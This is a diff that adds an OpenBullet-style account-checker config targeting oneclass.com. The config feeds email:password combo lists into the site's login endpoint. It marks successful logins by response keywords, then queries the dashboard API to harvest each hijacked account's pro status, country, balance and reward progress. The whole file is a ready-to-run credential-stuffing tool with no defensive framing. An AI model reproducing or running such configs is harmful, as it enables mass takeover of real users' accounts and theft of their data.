@@ -1,0 +1,53 @@
+[SETTINGS]
+{
+  "Name": "oneclass.com",
+  "SuggestedBots": 3,
+  "LastModified": "2018-09-29T17:04:07.7319806+00:00",
+  "AdditionalInfo": "",
+  "Author": "PaparazziTeam",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#URL1 REQUEST POST "https://oneclass.com/sessions/create_from_popup" AutoRedirect=TRUE 
+  CONTENT "email=<USER>&password=<PASS>&current_url=%2Flogin.en.html" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Accept: application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "X-NewRelic-ID: UgcAV1dACgcFVVlRAg==" 
+  HEADER "Origin: https://oneclass.com" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Referer: https://oneclass.com/login.en.html" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "school_id\":true" 
+  KEYCHAIN Failure OR 
+    KEY "Invalid email or password, please try again." 
+#URL2 REQUEST GET "https://oneclass.com/api/dashboard?_=1538238433008" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "X-NewRelic-ID: UgcAV1dACgcFVVlRAg==" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Referer: https://oneclass.com/dashboard" 
+#active_pro PARSE "<SOURCE>" LR "\"active_pro\":" "," Recursive=FALSE -> VAR "active_pro" "" "" 
+#Country PARSE "<SOURCE>" LR ",\"name\":\"" "\"" Recursive=FALSE -> VAR "Country" "" "" 
+#Current_balance PARSE "<SOURCE>" LR "\"current_balance\":" "," Recursive=FALSE -> VAR "Current_balance" "" "" 
+#Reward_progress PARSE "<SOURCE>" LR "\"reward_progress\":" "," Recursive=FALSE -> VAR "Reward_progress" "" "" 
